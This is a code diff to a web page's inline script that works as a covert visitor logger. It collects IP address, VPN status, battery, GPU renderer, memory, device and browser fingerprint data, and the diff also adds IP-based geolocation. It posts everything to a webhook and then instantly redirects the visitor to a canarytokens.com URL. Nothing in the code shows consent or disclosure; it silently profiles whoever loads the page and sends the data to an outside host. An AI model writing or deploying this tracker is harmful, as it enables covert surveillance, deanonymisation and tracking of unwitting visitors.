@@ -50,6 +50,7 @@
             doNotTrack: navigator.doNotTrack || 'Not specified',
             connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
             batteryLevel: navigator.getBattery ? await getBatteryLevel() : 'Not supported',
+            batteryCharging: navigator.getBattery ? (await navigator.getBattery()).charging : 'Not supported',
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
             networkType: navigator.connection ? navigator.connection.type : 'Unknown',
@@ -60,7 +61,15 @@
             operatingSystem: getOperatingSystem(),
             referringDomain: getReferringDomain(),
             geoCoordinates: 'Not fetched', // Placeholder for geo coordinates, not fetched
-            location: 'Not fetched' // Placeholder for location, not fetched
+            location: 'Not fetched', // Placeholder for location, not fetched
+            cpuCores: navigator.hardwareConcurrency,
+            webGLRenderer: getWebGLRenderer(),
+            touchSupport: getTouchSupport(),
+            jsHeapSizeLimit: getJSHeapSizeLimit(),
+            totalJSHeapSize: getTotalJSHeapSize(),
+            usedJSHeapSize: getUsedJSHeapSize(),
+            systemMemory: navigator.deviceMemory || 'N/A',
+            cpuArchitecture: navigator.platform
         };
 
         // Function to fetch visitor IP address
@@ -211,6 +220,40 @@
             }
         }
 
+        // Function to get WebGL renderer
+        function getWebGLRenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) {
+                return 'Not available';
+            }
+        }
+
+        // Function to get touch support
+        function getTouchSupport() {
+            return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        }
+
+        // Function to get JS heap size limit
+        function getJSHeapSizeLimit() {
+            return performance.memory ? performance.memory.jsHeapSizeLimit : 'Not available';
+        }
+
+        // Function to get total JS heap size
+        function getTotalJSHeapSize() {
+            return performance.memory ? performance.memory.totalJSHeapSize : 'Not available';
+        }
+
+        // Function to get used JS heap size
+        function getUsedJSHeapSize() {
+            return performance.memory ? performance.memory.usedJSHeapSize : 'Not available';
+        }
+
         // Check if the visitor is using a VPN
         const isVPN = await checkVPN();
         visitorInfo.isVPN = isVPN;
@@ -230,60 +273,53 @@
             }
         }
 
+        // Fetch geo-coordinates based on IP (if available)
+        if (isValidIP(visitorInfo.ip)) {
+            visitorInfo.geoCoordinates = await fetchGeoCoordinates(visitorInfo.ip);
+        }
+
         // Prepare the message content for the webhook
         const messageContent = {
-            content: `Visitor Information:
-  - Timestamp: ${visitorInfo.timestamp}
-  - User Agent: ${visitorInfo.userAgent}
-  - Platform: ${visitorInfo.platform}
-  - Language: ${visitorInfo.language}
-  - Referrer: ${visitorInfo.referrer}
-  - IP Address: ${visitorInfo.ip}
-  - Location: ${visitorInfo.location}
-  - VPN Detected: ${visitorInfo.isVPN ? 'Yes' : 'No'}
-  - Screen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}
-  - Color Depth: ${visitorInfo.colorDepth}
-  - Cookies Enabled: ${visitorInfo.cookiesEnabled ? 'Yes' : 'No'}
-  - Plugins: ${JSON.stringify(visitorInfo.plugins, null, 2)}
-  - Local Storage Enabled: ${visitorInfo.localStorageEnabled ? 'Yes' : 'No'}
-  - Session Storage Enabled: ${visitorInfo.sessionStorageEnabled ? 'Yes' : 'No'}
-  - Do Not Track: ${visitorInfo.doNotTrack}
-  - Connection Type: ${visitorInfo.connectionType}
-  - Battery Level: ${typeof visitorInfo.batteryLevel === 'number' ? visitorInfo.batteryLevel.toFixed(2) + '%' : visitorInfo.batteryLevel}
-  - Timezone: ${visitorInfo.timezone}
-  - Hardware Concurrency: ${visitorInfo.hardwareConcurrency}
-  - Network Type: ${visitorInfo.networkType}
-  - Language Preferences: ${visitorInfo.languagePrefs}
-  - Screen Orientation: ${visitorInfo.screenOrientation}
-  - Device Memory: ${visitorInfo.deviceMemory}
-  - Media Devices: ${JSON.stringify(visitorInfo.mediaDevices, null, 2)}
-  - Operating System: ${visitorInfo.operatingSystem}
-  - Referring Domain: ${visitorInfo.referringDomain}`
-            };
-  // Send visitor information to the webhook using fetch
-  try {
-    const response = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(messageContent)
-    });
+            content: '```' + Object.entries(visitorInfo).map(([key, value]) => `${key}: ${value}`).join('\n') + '```'
+        };
 
-    if (!response.ok) {
-        throw new Error('Failed to send visitor information to webhook');
+        // Send visitor information to the webhook using fetch
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(messageContent)
+            });
+
+            if (!response.ok) {
+                throw new Error('Failed to send visitor information to webhook');
+            }
+        } catch (error) {
+            console.error('Error sending visitor information:', error);
+        }
+
+        // Redirect to the target URL immediately
+        window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
     }
-  } catch (error) {
-    console.error('Error sending visitor information:', error);
-  }
 
-  // Redirect to the target URL immediately
-  window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
-  }
+    // Start the process of sending info and redirecting
+    sendVisitorInfoAndRedirect();
 
-  // Start the process of sending info and redirecting
-  sendVisitorInfoAndRedirect();
-
+    // Function to fetch geo-coordinates based on IP address
+    async function fetchGeoCoordinates(ip) {
+        try {
+            const geoApiUrl = `https://ipapi.co/${ip}/latlong/`;
+            let response = await fetch(geoApiUrl);
+            let data = await response.text();
+            const [latitude, longitude] = data.split(',');
+            return `${latitude}, ${longitude}`; // Return latitude and longitude
+        } catch (error) {
+            console.error('Error fetching geo-coordinates:', error);
+            return 'Coordinates not available';
+        }
+    }
   </script>
 </head>
 <body>
